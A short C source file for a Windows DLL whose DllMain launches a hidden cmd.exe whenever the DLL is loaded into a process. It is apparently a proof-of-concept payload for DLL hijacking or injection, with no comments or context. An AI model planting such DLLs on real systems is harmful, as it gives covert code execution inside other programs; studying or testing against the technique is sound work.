#include <windows.h>
#include <stdlib.h>

BOOL WINAPI DllMain(HINSTANCE x, DWORD y, void * z) {
	switch (y)
	{
		case DLL_PROCESS_ATTACH:
			ShellExecuteA(NULL, "open", "cmd.exe", "", NULL, 0);
			break;
	}
	return TRUE;
}

